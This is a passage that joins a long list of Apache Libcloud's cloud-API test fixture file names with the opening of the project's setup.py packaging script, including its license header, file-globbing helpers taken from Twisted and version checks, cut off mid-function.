_subscriptions_99999999_providers_Microsoft_Commerce_RateCard.json _subscriptions_99999999_providers_Microsoft_Compute.json _subscriptions_99999999_providers_Microsoft_Compute_disks.json _subscriptions_99999999_providers_Microsoft_Compute_locations_eastus_vmSizes.json _subscriptions_99999999_providers_Microsoft_Compute_snapshots.json _subscriptions_99999999_providers_Microsoft_Compute_virtualMachines.json _subscriptions_99999999_providers_Microsoft_Network_networkInterfaces.json _subscriptions_99999999_providers_Microsoft_Network_virtualnetworks.json _subscriptions_99999999_resourceGroups_000000_providers_Microsoft_Compute_disks_test_disk_1.json _subscriptions_99999999_resourceGroups_000000_providers_Microsoft_Compute_snapshots_test_snap_1.json _subscriptions_99999999_resourceGroups_000000_providers_Microsoft_Compute_virtualMachines_test_node_1.json _subscriptions_99999999_resourceGroups_000000_providers_Microsoft_Compute_virtualMachines_test_node_1_InstanceView.json _subscriptions_99999999_resourceGroups_000000_providers_Microsoft_Network_networkInterfaces_test_node_1_nic.json _subscriptions_99999999_resourceGroups_111111_providers_Microsoft_Compute_disks.json _subscriptions_99999999_resourceGroups_111111_providers_Microsoft_Compute_snapshots.json _subscriptions_99999999_resourceGroups_REVIZOR_providers_Microsoft_Network_networkInterfaces_test_nic.json _subscriptions_99999999_resourceGroups_REVIZOR_providers_Microsoft_Network_publicIPAddresses_test_public_ip.json _subscriptions_99999999_resourceGroups_REVIZOR_providers_Microsoft_Network_virtualNetworks_test_network_CheckIPAddressAvailability.json _subscriptions_subid_resourceGroups_rg1_providers_Microsoft_Network_publicIPAddresses_test_ip.json api_blocks_99df878c_6e5c_4945_a635_d94da9fd3146_json.json api_blocks_99df878c_6e5c_4945_a635_d94da9fd3146_json_delete.json api_blocks_99df878c_6e5c_4945_a635_d94da9fd3146_reboot_json.json api_blocks_json.json api_blocks_json_post.json api_block_products_json.json api_block_templates_json.json create_cloud_ip.json create_server.json create_server_gb1_a.json create_server_gb1_b.json list_cloud_ips.json list_images.json list_servers.json list_server_types.json list_zones.json token.json create_node.json list_images.json list_nodes.json list_sizes.json drives_clone.txt drives_info.txt drives_single_info.txt drives_standard_info.txt resources_ip_create.txt resources_ip_list.txt servers_create.txt servers_info.txt servers_set.txt balance.json capabilities.json create_subscription.json currentusage.json drives_avail_groups.json drives_clone.json drives_create.json drives_detail.json drives_get.json drives_resize.json fwpolicies_create_no_rules.json fwpolicies_create_with_rules.json fwpolicies_detail.json keypairs_get.json keypairs_import.json keypairs_list.json libdrives.json pricing.json servers_attach_policy.json servers_avail_groups.json servers_clone.json servers_close_vnc.json servers_create.json servers_create_with_vlan.json servers_detail_all_stopped.json servers_detail_mixed_state.json servers_get.json servers_open_vnc.json start_already_started.json start_success.json stop_already_stopped.json stop_success.json subscriptions.json tags_create.json tags_create_with_resources.json tags_detail.json tags_get.json tags_update.json unknown_error.json addNicToVirtualMachine_default.json associateIpAddress_default.json attachVolume_default.json authorizeSecurityGroupIngress_default.json createAffinityGroup_default.json createEgressFirewallRule_default.json createFirewallRule_default.json createFirewallRule_firewallicmp.json createNetworkACLList_default.json createNetworkACL_default.json createNetwork_default.json createPortForwardingRule_default.json createSecurityGroup_default.json createSnapshot_default.json createSSHKeyPair_default.json createTags_default.json createTemplate_default.json createVolume_default.json createVolume_withcustomdisksize.json createVolume_withvolumetype.json createVPC_default.json createVpnConnection_default.json createVpnCustomerGateway_default.json createVpnGateway_default.json deleteAffinityGroup_default.json deleteEgressFirewallRule_default.json deleteFirewallRule_default.json deleteNetwork_default.json deletePortForwardingRule_default.json deleteSecurityGroup_default.json deleteSnapshot_default.json deleteSSHKeyPair_default.json deleteTags_default.json deleteVolume_default.json deleteVPC_default.json deleteVpnConnection_default.json deleteVpnCustomerGateway_default.json deleteVpnGateway_default.json deployVirtualMachine_default.json deployVirtualMachine_deployfail.json deployVirtualMachine_deployfail2.json deployVirtualMachine_deployip.json deployVirtualMachine_deploykeyname.json deployVirtualMachine_deploynetworks.json deployVirtualMachine_deployproject.json deployVirtualMachine_deploysecuritygroup.json deployVirtualMachine_rootdisksize.json deployVirtualMachine_stoppedvm.json destroyVirtualMachine_default.json detachVolume_default.json disassociateIpAddress_default.json dummy_rsa.pub listAffinityGroups_default.json listAffinityGroupTypes_default.json listDiskOfferings_default.json listDiskOfferings_withcustomdisksize.json listDiskOfferings_withvolumetype.json listEgressFirewallRules_default.json listFirewallRules_default.json listFirewallRules_firewallicmp.json listIpForwardingRules_default.json listNetworkACLLists_default.json listNetworkACLs_default.json listNetworkOfferings_default.json listNetworks_default.json listNetworks_deployfail.json listNetworks_deployfail2.json listNetworks_deployip.json listNetworks_deploynetworks.json listNetworks_rootdisksize.json listNetworks_stoppedvm.json listNics_default.json listOsTypes_default.json listPortForwardingRules_default.json listProjects_default.json listPublicIpAddresses_default.json listPublicIpAddresses_firewallicmp.json listResourceLimits_default.json listRouters_default.json listSecurityGroups_default.json listSecurityGroups_no_groups.json listServiceOfferings_default.json listServiceOfferings_deployip.json listServiceOfferings_deploynetworks.json listServiceOfferings_rootdisksize.json listServiceOfferings_stoppedvm.json listSnapshots_default.json listSSHKeyPairs_default.json listSSHKeyPairs_get_one.json listSSHKeyPairs_get_one_doesnt_exist.json listSSHKeyPairs_no_keys.json listTemplates_default.json listTemplates_deployip.json listTemplates_deploynetworks.json listTemplates_notemplates.json listTemplates_rootdisksize.json listTemplates_stoppedvm.json listVirtualMachines_default.json listVirtualMachines_noipaddress.json listVolumes_default.json listVolumes_rootdisksize.json listVPCOfferings_default.json listVPCs_default.json listVpnConnections_default.json listVpnCustomerGateways_default.json listVpnGateways_default.json listZones_default.json listZones_deployfail.json listZones_deployfail2.json listZones_deployip.json listZones_deploynetworks.json listZones_rootdisksize.json listZones_stoppedvm.json listZones_withcustomdisksize.json listZones_withvolumetype.json queryAsyncJobResult_11111.json queryAsyncJobResult_111112.json queryAsyncJobResult_11112.json queryAsyncJobResult_11113.json queryAsyncJobResult_11114.json queryAsyncJobResult_11115.json queryAsyncJobResult_11116.json queryAsyncJobResult_11117.json queryAsyncJobResult_1149341.json queryAsyncJobResult_1149342.json queryAsyncJobResult_1149343.json queryAsyncJobResult_1149366.json queryAsyncJobResult_1300001.json queryAsyncJobResult_1300002.json queryAsyncJobResult_1300003.json queryAsyncJobResult_1300004.json queryAsyncJobResult_1300005.json queryAsyncJobResult_1300006.json queryAsyncJobResult_17164.json queryAsyncJobResult_17165.json queryAsyncJobResult_17166.json queryAsyncJobResult_17177.json queryAsyncJobResult_17188.json queryAsyncJobResult_17199.json queryAsyncJobResult_17200.json queryAsyncJobResult_88776.json queryAsyncJobResult_88777.json queryAsyncJobResult_addnictovm.json queryAsyncJobResult_attachvolumejob.json queryAsyncJobResult_createtagsjob.json queryAsyncJobResult_createvolumejob.json queryAsyncJobResult_createVpnConnection.json queryAsyncJobResult_createVpnCustomerGateway.json queryAsyncJobResult_createVpnGateway.json queryAsyncJobResult_deleteNetwork.json queryAsyncJobResult_deletetagsjob.json queryAsyncJobResult_deleteVPC.json queryAsyncJobResult_deleteVpnConnection.json queryAsyncJobResult_deleteVpnCustomerGateway.json queryAsyncJobResult_deleteVpnGateway.json queryAsyncJobResult_deployrootdisksize.json queryAsyncJobResult_deployvmstopped.json queryAsyncJobResult_deployvmwithid.json queryAsyncJobResult_detachvolumejob.json queryAsyncJobResult_removenic.json rebootVirtualMachine_default.json registerSSHKeyPair_default.json registerSSHKeyPair_error.json removeNicFromVirtualMachine_default.json restoreVirtualMachine_default.json scaleVirtualMachine_default.json startVirtualMachine_default.json stopVirtualMachine_default.json updateVMAffinityGroup_default.json create_image.json create_key_pair.json error.json ex_power_on_node.json ex_shutdown_node.json get_image.json list_key_pairs.json list_nodes_page_1.json attach_floating_ip.json attach_volume.json create_floating_ip.json create_image.json create_key_pair.json create_node.json create_volume.json create_volume_snapshot.json detach_floating_ip.json detach_volume.json error.json error_invalid_image.json ex_change_kernel.json ex_enable_ipv6.json ex_hard_reboot.json ex_power_on_node.json ex_rebuild_node.json ex_rename_node.json ex_resize_node.json ex_shutdown_node.json get_image.json list_floating_ips.json list_images.json list_key_pairs.json list_locations.json list_node.json list_nodes.json list_nodes_empty.json list_nodes_page_1.json list_sizes.json list_volumes.json list_volumes_empty.json list_volume_snapshots.json reboot_node.json change_nic_networkadapter_response.xml deploy_customised_server.xml exchange_nic_vlans_response.xml image_customerImage.xml image_customerImage_2ffa36c8_1848_49eb_b4fa_9d908775f68c.xml image_customerImage_5234e5c7_01de_4411_8b6e_baeb8d91cf5d.xml image_osImage.xml image_osImage_6b4fb0c7_a57b_4f58_b59c_9958f94f971a.xml image_osImage_c14b1a46_2428_44c1_9c1a_b20e6418d08c.xml import_image_response.xml server_cleanServer.xml server_clone_response.xml server_GetServer.xml server_server.xml server_server_e75ead52_692f_4314_8725_c8a4f4d13a87.xml server_server_NA3.xml server_server_paginated.xml audit_log.csv detailed_usage_report.csv image_customerImage.xml image_customerImage_2ffa36c8_1848_49eb_b4fa_9d908775f68c.xml image_customerImage_5234e5c7_01de_4411_8b6e_baeb8d91cf5d.xml image_customerImage_BAD_REQUEST.xml image_osImage.xml image_osImage_6b4fb0c7_a57b_4f58_b59c_9958f94f971a.xml image_osImage_BAD_REQUEST.xml image_osImage_c14b1a46_2428_44c1_9c1a_b20e6418d08c.xml infrastructure_datacenter.xml infrastructure_datacenter_NA9.xml ip_address_lists.xml ip_address_lists_FILTERBYNAME.xml ip_address_list_create.xml ip_address_list_delete.xml ip_address_list_edit.xml network_addPublicIpBlock.xml network_createFirewallRule.xml network_createNatRule.xml network_deleteFirewallRule.xml network_deleteNatRule.xml network_deleteNetworkDomain.xml network_deleteVlan.xml network_deployNetworkDomain.xml network_deployVlan.xml network_editFirewallRule.xml network_editNetworkDomain.xml network_editVlan.xml network_expandVlan.xml network_firewallRule.xml network_firewallRule_d0a20f59_77b9_4f28_a63b_e58496b73a6c.xml network_natRule.xml network_natRule_2187a636_7ebb_49a1_a2ff_5d617f496dce.xml network_networkDomain.xml network_networkDomain_8cdfd607_f429_4df6_9352_162cfc0891be.xml network_publicIpBlock.xml network_publicIpBlock_4487241a_f0ca_11e3_9315_d4bed9b167ba.xml network_publicIpBlock_9945dc4a_bdce_11e4_8c14_b8ca3a5d9ef8.xml network_removePublicIpBlock.xml network_vlan.xml network_vlan_0e56433f_d808_4669_821d_812769517ff8.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_antiAffinityRule_create.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_antiAffinityRule_create_FAIL.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_antiAffinityRule_delete.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_antiAffinityRule_delete_FAIL.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_datacenter.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_networkWithLocation.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_network_4bba37be_506f_11e3_b29c_001517c4643e.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_11_delete.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_11_delete_INPROGRESS.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_11_poweroff.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_11_poweroff_INPROGRESS.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_11_restart.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_11_restart_INPROGRESS.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_11_shutdown.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_11_shutdown_INPROGRESS.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_11_start.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_11_start_INPROGRESS.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_deployed.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_e75ead52_692f_4314_8725_c8a4f4d13a87.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_e75ead52_692f_4314_8725_c8a4f4d13a87_disk_1.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_e75ead52_692f_4314_8725_c8a4f4d13a87_disk_1_changeSize.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_e75ead52_692f_4314_8725_c8a4f4d13a87_disk_1_changeSpeed.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_e75ead52_692f_4314_8725_c8a4f4d13a87_POST.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_pendingDeploy.xml oec_0_9_base_image.xml oec_0_9_base_imageWithDiskSpeed.xml oec_0_9_myaccount.xml port_list_create.xml port_list_delete.xml port_list_edit.xml port_list_get.xml port_list_lists.xml report_usageMonitoring.xml server_addDisk.xml server_addNic.xml server_antiAffinityRule_list.xml server_antiAffinityRule_list_PAGINATED.xml server_changeServerMonitoringPlan.xml server_cleanServer.xml server_deleteServer.xml server_deleteServer_RESOURCEBUSY.xml server_deployServer.xml server_disableServerMonitoring.xml server_enableServerMonitoring.xml server_GetServer.xml server_powerOffServer.xml server_powerOffServer_INPROGRESS.xml server_rebootServer.xml server_rebootServer_RESOURCEBUSY.xml server_reconfigureServer.xml server_removeDisk.xml server_removeNic.xml server_resetServer.xml server_server.xml server_server_e75ead52_692f_4314_8725_c8a4f4d13a87.xml server_server_NA3.xml server_server_paginated.xml server_server_paginated_empty.xml server_shutdownServer.xml server_shutdownServer_INPROGRESS.xml server_startServer.xml server_startServer_INPROGRESS.xml server_updateVmwareTools.xml summary_usage_report.csv tag_applyTags.xml tag_applyTags_BADREQUEST.xml tag_createTagKey.xml tag_createTagKey_BADREQUEST.xml tag_deleteTagKey.xml tag_deleteTagKey_BADREQUEST.xml tag_editTagKey.xml tag_editTagKey_BADREQUEST.xml tag_removeTag.xml tag_removeTag_BADREQUEST.xml tag_tagKey_5ab77f5f_5aa9_426f_8459_4eab34e03d54.xml tag_tagKey_5ab77f5f_5aa9_426f_8459_4eab34e03d54_BADREQUEST.xml tag_tagKey_list.xml tag_tagKey_list_SINGLE.xml tag_tag_list.xml _oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server.xml allocate_address.xml allocate_vpc_address.xml associate_address.xml associate_vpc_address.xml attach_internet_gateway.xml attach_network_interface.xml attach_volume.xml authorize_security_group_egress.xml authorize_security_group_ingress.xml copy_image.xml create_encrypted_volume.xml create_image.xml create_internet_gateway.xml create_key_pair.xml create_network_interface.xml create_placement_groups.xml create_security_group.xml create_snapshot.xml create_subnet.xml create_tags.xml create_volume.xml create_vpc.xml delete_internet_gateway.xml delete_key_pair.xml delete_network_interface.xml delete_placement_groups.xml delete_security_group.xml delete_snapshot.xml delete_subnet.xml delete_tags.xml delete_volume.xml delete_vpc.xml deregister_image.xml describe_account_attributes.xml describe_addresses.xml describe_addresses_all.xml describe_addresses_multi.xml describe_addresses_single.xml describe_availability_zones.xml describe_images.xml describe_images_ex_imageids.xml describe_import_snapshot_tasks.xml describe_import_snapshot_tasks_active.xml describe_instances.xml describe_instance_types.xml describe_internet_gateways.xml describe_key_pairs.xml describe_key_pairs_doesnt_exist.xml describe_network_interfaces.xml describe_placement_groups.xml describe_reserved_instances.xml describe_security_groups.xml describe_snapshots.xml describe_subnets.xml describe_tags.xml describe_volumes.xml describe_volumes_modifications.xml describe_vpcs.xml detach_internet_gateway.xml detach_network_interface.xml detach_volume.xml disassociate_address.xml get_console_output.xml import_key_pair.xml import_snapshot.xml modify_image_attribute.xml modify_instance_attribute.xml modify_snapshot_attribute.xml modify_subnet_attribute.xml modify_volume.xml reboot_instances.xml register_image.xml release_address.xml revoke_security_group_egress.xml revoke_security_group_ingress.xml run_instances.xml run_instances_iam_profile.xml run_instances_idem.xml run_instances_idem_mismatch.xml run_instances_spot.xml run_instances_with_subnet_and_security_group.xml start_instances.xml stop_instances.xml terminate_instances.xml htemplate_list.json network_list.json ptemplate_list.json vm_1_action_delete.json vm_1_action_start.json vm_1_action_stop.json vm_1_get.json vm_list.json vm_put.json attach_disk.xml copy_image.xml create_disk.xml create_image.xml create_instance.xml create_node_describe_instances.xml create_public_ip.xml create_security_group.xml create_snapshot.xml create_volume_describe_disks.xml delete_disk.xml delete_image.xml delete_instance.xml delete_security_group_by_id.xml delete_snapshot.xml describe_disks.xml describe_images.xml describe_instances.xml describe_instance_types.xml describe_regions.xml describe_security_groups.xml describe_security_group_attributes.xml describe_snapshots.xml describe_zones.xml destroy_node_describe_instances.xml destroy_volume_describe_disks.xml detach_disk.xml detach_volume_describe_disks.xml get_image_describe_images.xml join_security_group_by_id.xml leave_security_group_by_id.xml modify_security_group_by_id.xml pages_describe_images.xml pages_describe_images_page2.xml reboot_instance.xml reboot_node_describe_instances.xml start_instance.xml stop_instance.xml stop_node_describe_instances.xml drives_create.json drives_info.json offline_servers_info.json servers_create.json servers_info.json associate_ip.json attach_volume.json bgp_config_project_1.json bgp_config_project_2.json bgp_config_project_3.json bgp_sessions.json bgp_session_create.json bgp_session_get.json create_volume.json devices.json devices_for_project.json device_create.json device_events.json facilities.json ip_address.json ip_assignments.json node_bandwidth.json operatingsystems.json plans.json projects.json project_events.json project_ips.json reserve_ip.json sshkeys.json sshkey_create.json volumes.json ex_describe_instance_types.xml ex_describe_product_types.xml ex_describe_quotas.xml ex_get_product_type.xml ex_modify_instance_keypair.xml account_info.xml account_info_rating.xml datacenter_list.xml disk_attach.xml disk_create.xml disk_create_from.xml disk_delete.xml disk_detach.xml disk_info.xml disk_list.xml disk_update.xml iface_attach.xml iface_detach.xml iface_list.xml image_list_dc0.xml ip_list.xml operation_info.xml ssh_delete.xml ssh_info.xml ssh_list.xml vm_create_from.xml vm_delete.xml vm_info.xml vm_list.xml vm_reboot.xml vm_stop.xml aggregated_addresses.json aggregated_autoscalers.json aggregated_disks.json aggregated_disktypes.json aggregated_forwardingRules.json aggregated_instanceGroupManagers.json aggregated_instances.json aggregated_machineTypes.json aggregated_subnetworks.json aggregated_targetInstances.json aggregated_targetPools.json generic_disk.json global_addresses.json global_addresses_lcaddressglobal.json global_addresses_lcaddressglobal_delete.json global_addresses_post.json global_backendServices-empty.json global_backendServices-web-service.json global_backendServices_no_backends.json global_backendServices_post.json global_backendServices_web_service.json global_backendServices_web_service_delete.json global_custom_image_setLabels_post.json global_firewalls.json global_firewalls_lcfirewall-deny.json global_firewalls_lcfirewall-egress.json global_firewalls_lcfirewall.json global_firewalls_lcfirewall_delete.json global_firewalls_lcfirewall_put.json global_firewalls_post.json global_forwardingRules.json global_forwardingRules_http_rule.json global_forwardingRules_http_rule_delete.json global_forwardingRules_post.json global_httpHealthChecks.json global_httpHealthChecks_basic-check.json global_httpHealthChecks_lchealthcheck.json global_httpHealthChecks_lchealthcheck_delete.json global_httpHealthChecks_lchealthcheck_put.json global_httpHealthChecks_libcloud-lb-demo-healthcheck.json global_httpHealthChecks_post.json global_images.json global_images_debian_7_wheezy_v20131014_deprecate.json global_images_debian_7_wheezy_v20131120_delete.json global_images_family_notfound.json global_images_paged.json global_images_post.json global_instanceTemplates.json global_instanceTemplates_insert.json global_instanceTemplates_my_instance_template1.json global_instanceTemplates_my_instance_template_shared_network.json global_networks.json global_networks_cf.json global_networks_custom_network.json global_networks_default.json global_networks_lcnetwork.json global_networks_lcnetwork_delete.json global_networks_libcloud-demo-europe-network.json global_networks_libcloud-demo-network.json global_networks_post.json global_operations_operation_setImageLabels_post.json global_routes.json global_routes_lcdemoroute.json global_routes_lcdemoroute_delete.json global_routes_post.json global_snapshots.json global_snapshots_lcsnapshot.json global_snapshots_lcsnapshot_delete.json global_sslcertificates.json global_sslcertificates_example.json global_sslcertificates_post.json global_targetHttpProxies.json global_targetHttpProxies_post.json global_targetHttpProxies_web_proxy.json global_targetHttpProxies_web_proxy_delete.json global_urlMaps.json global_urlMaps_post.json global_urlMaps_web_map.json global_urlMaps_web_map_delete.json operations_operation_global_addresses_lcaddressglobal_delete.json operations_operation_global_addresses_post.json operations_operation_global_backendServices_post.json operations_operation_global_backendServices_web_service_delete.json operations_operation_global_firewalls_lcfirewall_delete.json operations_operation_global_firewalls_lcfirewall_put.json operations_operation_global_firewalls_post.json operations_operation_global_forwardingRules_http_rule_delete.json operations_operation_global_forwardingRules_post.json operations_operation_global_httpHealthChecks_lchealthcheck_delete.json operations_operation_global_httpHealthChecks_lchealthcheck_put.json operations_operation_global_httpHealthChecks_post.json operations_operation_global_images_debian7_delete.json operations_operation_global_image_post.json operations_operation_global_instanceTemplates_insert.json operations_operation_global_networks_lcnetwork_delete.json operations_operation_global_networks_post.json operations_operation_global_routes_lcdemoroute_delete.json operations_operation_global_routes_post.json operations_operation_global_snapshots_lcsnapshot_delete.json operations_operation_global_sslcertificates_post.json operations_operation_global_targetHttpProxies_post.json operations_operation_global_targetHttpProxies_web_proxy_delete.json operations_operation_global_urlMaps_post.json operations_operation_global_urlMaps_web_map_delete.json operations_operation_regions_us-central1_addresses_lcaddress_delete.json operations_operation_regions_us-central1_addresses_post.json operations_operation_regions_us-central1_forwardingRules_lcforwardingrule_delete.json operations_operation_regions_us-central1_forwardingRules_post.json operations_operation_regions_us-central1_subnetworks_post.json operations_operation_regions_us-central1_targetPools_lb_pool_setBackup_post.json operations_operation_regions_us-central1_targetPools_lctargetpool_addHealthCheck_post.json operations_operation_regions_us-central1_targetPools_lctargetpool_addInstance_post.json operations_operation_regions_us-central1_targetPools_lctargetpool_delete.json operations_operation_regions_us-central1_targetPools_lctargetpool_removeHealthCheck_post.json operations_operation_regions_us-central1_targetPools_lctargetpool_removeInstance_post.json operations_operation_regions_us-central1_targetPools_post.json operations_operation_setCommonInstanceMetadata.json operations_operation_setUsageExportBucket.json operations_operation_zones_europe-west1-a_instances_post.json operations_operation_zones_us-central1-a_disks_lcdisk_createSnapshot_post.json operations_operation_zones_us-central1-a_disks_lcdisk_delete.json operations_operation_zones_us-central1-a_disks_lcdisk_resize_post.json operations_operation_zones_us-central1-a_disks_lcdisk_setLabels_post.json operations_operation_zones_us-central1-a_disks_post.json operations_operation_zones_us-central1-a_instances_lcnode-000_delete.json operations_operation_zones_us-central1-a_instances_lcnode-001_delete.json operations_operation_zones_us-central1-a_instances_node-name_attachDisk_post.json operations_operation_zones_us-central1-a_instances_node-name_delete.json operations_operation_zones_us-central1-a_instances_node-name_detachDisk_pos,"# Licensed to the Apache Software Foundation (ASF) under one or more
# contributor license agreements.  See the NOTICE file distributed with
# this work for additional information regarding copyright ownership.
# The ASF licenses this file to You under the Apache License, Version 2.0
# (the ""License""); you may not use this file except in compliance with
# the License.  You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os
import sys
import re
import fnmatch

import setuptools
from setuptools import setup
from distutils.core import Command

try:
    import epydoc  # NOQA

    has_epydoc = True
except ImportError:
    has_epydoc = False

# NOTE: Those functions are intentionally moved in-line to prevent setup.py dependening on any
# Libcloud code which depends on libraries such as typing, enum, requests, etc.
# START: Taken From Twisted Python which licensed under MIT license
# https://github.com/powdahound/twisted/blob/master/twisted/python/dist.py
# https://github.com/powdahound/twisted/blob/master/LICENSE

# Names that are excluded from globbing results:
EXCLUDE_NAMES = [""{arch}"", ""CVS"", "".cvsignore"", ""_darcs"", ""RCS"", ""SCCS"", "".svn""]
EXCLUDE_PATTERNS = [""*.py[cdo]"", ""*.s[ol]"", "".#*"", ""*~"", ""*.py""]


def _filter_names(names):
    """"""
    Given a list of file names, return those names that should be copied.
    """"""
    names = [n for n in names if n not in EXCLUDE_NAMES]
    # This is needed when building a distro from a working
    # copy (likely a checkout) rather than a pristine export:
    for pattern in EXCLUDE_PATTERNS:
        names = [
            n
            for n in names
            if not fnmatch.fnmatch(n, pattern) and not n.endswith("".py"")
        ]
    return names


def relative_to(base, relativee):
    """"""
    Gets 'relativee' relative to 'basepath'.

    i.e.,

    >>> relative_to('/home/', '/home/radix/')
    'radix'
    >>> relative_to('.', '/home/radix/Projects/Twisted')
    'Projects/Twisted'

    The 'relativee' must be a child of 'basepath'.
    """"""
    basepath = os.path.abspath(base)
    relativee = os.path.abspath(relativee)
    if relativee.startswith(basepath):
        relative = relativee[len(basepath) :]
        if relative.startswith(os.sep):
            relative = relative[1:]
        return os.path.join(base, relative)
    raise ValueError(""%s is not a subpath of %s"" % (relativee, basepath))


def get_packages(dname, pkgname=None, results=None, ignore=None, parent=None):
    """"""
    Get all packages which are under dname. This is necessary for
    Python 2.2's distutils. Pretty similar arguments to getDataFiles,
    including 'parent'.
    """"""
    parent = parent or """"
    prefix = []
    if parent:
        prefix = [parent]
    bname = os.path.basename(dname)
    ignore = ignore or []
    if bname in ignore:
        return []
    if results is None:
        results = []
    if pkgname is None:
        pkgname = []
    subfiles = os.listdir(dname)
    abssubfiles = [os.path.join(dname, x) for x in subfiles]

    if ""__init__.py"" in subfiles:
        results.append(prefix + pkgname + [bname])
        for subdir in filter(os.path.isdir, abssubfiles):
            get_packages(
                subdir,
                pkgname=pkgname + [bname],
                results=results,
                ignore=ignore,
                parent=parent,
            )
    res = [""."".join(result) for result in results]
    return res


def get_data_files(dname, ignore=None, parent=None):
    """"""
    Get all the data files that should be included in this distutils Project.

    'dname' should be the path to the package that you're distributing.

    'ignore' is a list of sub-packages to ignore.  This facilitates
    disparate package hierarchies.  That's a fancy way of saying that
    the 'twisted' package doesn't want to include the 'twisted.conch'
    package, so it will pass ['conch'] as the value.

    'parent' is necessary if you're distributing a subpackage like
    twisted.conch.  'dname' should point to 'twisted/conch' and 'parent'
    should point to 'twisted'.  This ensures that your data_files are
    generated correctly, only using relative paths for the first element
    of the tuple ('twisted/conch/*').
    The default 'parent' is the current working directory.
    """"""
    parent = parent or "".""
    ignore = ignore or []
    result = []
    for directory, subdirectories, filenames in os.walk(dname):
        resultfiles = []
        for exname in EXCLUDE_NAMES:
            if exname in subdirectories:
                subdirectories.remove(exname)
        for ig in ignore:
            if ig in subdirectories:
                subdirectories.remove(ig)
        for filename in _filter_names(filenames):
            resultfiles.append(filename)
        if resultfiles:
            for filename in resultfiles:
                file_path = os.path.join(directory, filename)
                if parent:
                    file_path = file_path.replace(parent + os.sep, """")
                result.append(file_path)

    return result


# END: Taken from Twisted


# Different versions of python have different requirements.  We can't use
# libcloud.utils.py3 here because it relies on backports dependency being
# installed / available
PY_pre_36 = sys.version_info < (3, 6, 0)

HTML_VIEWSOURCE_BASE = ""https://svn.apache.org/viewvc/libcloud/trunk""
PROJECT_BASE_DIR = ""https://libcloud.apache.org""
TEST_PATHS = [
    ""libcloud/test"",
    ""libcloud/test/common"",
    ""libcloud/test/compute"",
    ""libcloud/test/storage"",
    ""libcloud/test/loadbalancer"",
    ""libcloud/test/dns"",
    ""libcloud/test/container"",
    ""libcloud/test/backup"",
]
DOC_TEST_MODULES = [
    ""libcloud.compute.drivers.dummy"",
    ""libcloud.storage.drivers.dummy"",
    ""libcloud.dns.drivers.dummy"",
    ""libcloud.container.drivers.dummy"",
    ""libcloud.backup.drivers.dummy"",
]

SUPPORTED_VERSIONS = [""PyPy 3.6+"", ""Python 3.6+""]

# NOTE: python_version syntax is only supported when build system has
# setuptools >= 36.2
# For installation, minimum required pip version is 1.4
# Reference: https://hynek.me/articles/conditional-python-dependencies/
# We rely on >= 2.26.0 to avoid issues with LGPL transitive dependency
# See https://github.com/apache/libcloud/issues/1594 for more context
INSTALL_REQUIREMENTS = []
INSTALL_REQUIREMENTS.append(""requests>=2.26.0"")


setuptools_version = tuple(setuptools.__version__.split(""."")[0:2])
setuptools_version = tuple([int(c) for c in setuptools_version])

if setuptools_version < (36, 2):
    if ""bdist_wheel"" in sys.argv:
        # NOTE: We need to do that because we use universal wheel
        msg = (
            ""Need to use latest version of setuptools when building wheels to ensure included ""
            ""metadata is correct. Current version: %s"" % (setuptools.__version__)
        )
        raise RuntimeError(msg)

TEST_REQUIREMENTS = [
    ""requests_mock"",
    ""pytest"",
    ""pytest-runner"",
] + INSTALL_REQUIREMENTS

if PY_pre_36:
    version = ""."".join([str(x) for x in sys.version_info[:3]])
    print(
        ""Python version %s is not supported. Supported versions are: %s. ""
        ""Latest version which supports Python 2.7 and Python 3 < 3.5.0 is ""
        ""Libcloud v2.8.2 and Libcloud v3.4.0 for Python 3.5.""
        % (version, "", "".join(SUPPORTED_VERSIONS))
    )
    sys.exit(1)


def read_version_string():
    version = None
    cwd = os.path.dirname(os.path.abspath(__file__))
    version_file = os.path.join(cwd, ""libcloud/__init__.py"")

    with open(version_file) as fp:
        content = fp.read()

    match = re.search(r""^__version__ = ['\""]([^'\""]*)['\""]"", content, re.M)

    if match:
        version = match.group(1)
        return version

    raise Exception(""Cannot find version in libcloud/__init__.py"")


def forbid_publish():
    argv = sys.argv
    if ""upload"" in argv:
        print(
            ""You shouldn't use upload command to upload a release to PyPi. ""
            ""You need to manually upload files generated using release.sh ""
            ""script.\n""
            'For more information, see ""Making a release section"" in the '
